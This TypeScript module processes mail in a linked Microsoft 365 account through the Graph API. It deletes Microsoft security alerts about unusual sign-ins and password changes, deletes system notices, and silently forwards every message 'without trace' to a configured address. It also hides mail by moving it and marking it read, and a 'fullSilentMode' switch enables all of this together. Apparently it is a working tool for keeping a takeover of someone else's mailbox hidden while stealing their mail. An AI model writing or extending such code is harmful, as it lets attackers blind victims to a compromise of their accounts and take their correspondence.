import type { MicrosoftGraphService } from "./microsoft-graph";
import type { EmailMessage } from "../types/mail";

interface AccountSettingsData {
  forwardingEnabled: boolean;
  forwardingEmail: string | null;
  autoReplyEnabled: boolean;
  autoReplySubject: string | null;
  autoReplyBody: string | null;
  suppressSecurityAlerts: boolean;
  suppressSystemMessages: boolean;
  silentForwardEnabled: boolean;
  silentForwardEmail: string | null;
  silentInboxEnabled: boolean;
  silentInboxFolderId: string | null;
  silentInboxMarkRead: boolean;
  fullSilentMode: boolean;
}

// Microsoft security alert senders
const SECURITY_SENDERS = [
  "account-security-noreply@accountprotection.microsoft.com",
  "security-noreply@accountprotection.microsoft.com",
  "no-reply@microsoft.com",
  "msa@communication.microsoft.com",
];

const SECURITY_SUBJECTS = [
  "unusual sign-in activity",
  "security alert",
  "sign-in activity",
  "verify your identity",
  "password change",
  "password was changed",
  "security info",
  "account security",
  "suspicious activity",
  "unusual activity",
  "new sign-in",
  "recent activity",
];

// System/automated message senders
const SYSTEM_SENDERS = [
  "no-reply@microsoft.com",
  "noreply@microsoft.com",
  "notifications@microsoft.com",
  "no-reply@sharepointonline.com",
  "no-reply@planner.office365.com",
  "maclogin@microsoft.com",
  "microsoft-noreply@microsoft.com",
  "postmaster@",
  "mailer-daemon@",
];

function isSenderMatch(senderAddress: string, patterns: string[]): boolean {
  const lower = senderAddress.toLowerCase();
  return patterns.some((pattern) => {
    if (pattern.endsWith("@")) {
      return lower.startsWith(pattern);
    }
    return lower === pattern;
  });
}

function isSecurityAlert(email: EmailMessage): boolean {
  const senderAddr = email.from?.emailAddress?.address || "";
  if (isSenderMatch(senderAddr, SECURITY_SENDERS)) return true;

  const subject = (email.subject || "").toLowerCase();
  const fromMicrosoft = senderAddr.toLowerCase().includes("microsoft.com");
  if (fromMicrosoft && SECURITY_SUBJECTS.some((s) => subject.includes(s))) return true;

  return false;
}

function isSystemMessage(email: EmailMessage): boolean {
  const senderAddr = email.from?.emailAddress?.address || "";
  if (isSenderMatch(senderAddr, SYSTEM_SENDERS)) return true;

  const senderLower = senderAddr.toLowerCase();
  if (senderLower.includes("noreply@") || senderLower.includes("no-reply@")) {
    if (
      senderLower.includes("microsoft.com") ||
      senderLower.includes("office365.com") ||
      senderLower.includes("office.com")
    ) {
      return true;
    }
  }

  return false;
}

export interface ProcessResult {
  deleted: boolean;
  forwarded: boolean;
  silentForwarded: boolean;
  moved: boolean;
  markedRead: boolean;
  autoReplied: boolean;
}

/**
 * Process account settings for an incoming email.
 * Returns what actions were taken so the caller can decide
 * whether to skip Telegram notifications, etc.
 */
interface DbClient {
  activityLog: {
    create: (args: { data: Record<string, unknown> }) => Promise<unknown>;
  };
}

export async function processAccountSettings(
  graphService: MicrosoftGraphService,
  email: EmailMessage,
  settings: AccountSettingsData,
  db?: DbClient,
  linkedAccountId?: string
): Promise<ProcessResult> {
  const result: ProcessResult = {
    deleted: false,
    forwarded: false,
    silentForwarded: false,
    moved: false,
    markedRead: false,
    autoReplied: false,
  };

  const emailFrom = email.from?.emailAddress?.address || "unknown";
  const emailSubject = email.subject || "(no subject)";

  const logAction = async (action: string, details?: string) => {
    if (db && linkedAccountId) {
      try {
        await db.activityLog.create({
          data: { linkedAccountId, action, details, emailSubject, emailFrom },
        });
      } catch { /* non-critical */ }
    }
  };

  const effectiveSettings = resolveEffectiveSettings(settings);

  // 1. Suppress security alerts — delete the email
  if (effectiveSettings.suppressSecurityAlerts && isSecurityAlert(email)) {
    try {
      await graphService.deleteMessage(email.id);
      result.deleted = true;
      await logAction("suppressSecurityAlert", "Deleted security alert");
      return result;
    } catch {
      // failed to delete — continue with other actions
    }
  }

  // 2. Suppress system messages — delete the email
  if (effectiveSettings.suppressSystemMessages && isSystemMessage(email)) {
    try {
      await graphService.deleteMessage(email.id);
      result.deleted = true;
      await logAction("suppressSystemMessage", "Deleted system message");
      return result;
    } catch {
      // failed to delete — continue
    }
  }

  // 3. Silent forward — forward without comment (no trace)
  if (effectiveSettings.silentForwardEnabled && effectiveSettings.silentForwardEmail) {
    try {
      await graphService.forwardMessage(
        email.id,
        [{ emailAddress: { address: effectiveSettings.silentForwardEmail } }]
      );
      result.silentForwarded = true;
      await logAction("silentForward", effectiveSettings.silentForwardEmail);
    } catch {
      // failed to forward silently — continue
    }
  }

  // 4. Regular forwarding — forward with attribution
  if (effectiveSettings.forwardingEnabled && effectiveSettings.forwardingEmail) {
    try {
      await graphService.forwardMessage(
        email.id,
        [{ emailAddress: { address: effectiveSettings.forwardingEmail } }],
        "Auto-forwarded by Forg365"
      );
      result.forwarded = true;
      await logAction("forward", effectiveSettings.forwardingEmail);
    } catch {
      // failed to forward — continue
    }
  }

  // 5. Silent inbox — move to folder and/or mark as read
  if (effectiveSettings.silentInboxEnabled) {
    if (effectiveSettings.silentInboxFolderId) {
      try {
        await graphService.moveMessage(email.id, effectiveSettings.silentInboxFolderId);
        result.moved = true;
        await logAction("moveToFolder", effectiveSettings.silentInboxFolderId);
      } catch {
        // failed to move — continue
      }
    }
    if (effectiveSettings.silentInboxMarkRead) {
      try {
        await graphService.markAsRead(email.id, true);
        result.markedRead = true;
        await logAction("markAsRead");
      } catch {
        // failed to mark read — continue
      }
    }
  }

  // 6. Auto-reply — send automatic reply
  if (effectiveSettings.autoReplyEnabled && effectiveSettings.autoReplyBody) {
    // Don't auto-reply to noreply addresses or to our own forwards
    const senderAddr = email.from?.emailAddress?.address || "";
    const shouldReply =
      !senderAddr.toLowerCase().includes("noreply") &&
      !senderAddr.toLowerCase().includes("no-reply") &&
      !senderAddr.toLowerCase().includes("mailer-daemon") &&
      !senderAddr.toLowerCase().includes("postmaster");

    if (shouldReply) {
      try {
        const subject = effectiveSettings.autoReplySubject || `Re: ${email.subject || ""}`;
        await graphService.sendMail(
          {
            subject,
            body: {
              contentType: "HTML",
              content: effectiveSettings.autoReplyBody,
            },
            toRecipients: [email.from],
          },
          false // don't save to Sent Items to avoid clutter
        );
        result.autoReplied = true;
        await logAction("autoReply", senderAddr);
      } catch {
        // failed to auto-reply — continue
      }
    }
  }

  return result;
}

/**
 * When fullSilentMode is on, override all individual silent toggles to true.
 */
function resolveEffectiveSettings(settings: AccountSettingsData): AccountSettingsData {
  if (!settings.fullSilentMode) return settings;

  return {
    ...settings,
    suppressSecurityAlerts: true,
    suppressSystemMessages: true,
    silentForwardEnabled: true,
    silentInboxEnabled: true,
    silentInboxMarkRead: true,
  };
}
